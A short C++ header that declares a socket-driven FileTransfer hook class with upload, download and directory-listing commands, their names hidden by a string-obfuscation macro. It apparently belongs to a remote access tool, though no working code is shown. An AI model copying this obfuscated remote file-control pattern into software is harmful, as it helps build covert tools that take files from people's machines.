#pragma once
#include "common.h"
#include "Hook.h"

#define BUFFER_READ 2048

#define CMD_FILE_UPLOAD std::string{ AY_OBFUSCATE("upload") }
#define CMD_FILE_DOWNLOAD std::string{ AY_OBFUSCATE("download") }
#define CMD_EXPLORER_LIST std::string{ AY_OBFUSCATE("listdir") }

class FileTransfer :
    public Hook
{
    public:
        FileTransfer();
        ~FileTransfer();

        void HandleHook(SOCKET s, const std::string& hook);
};

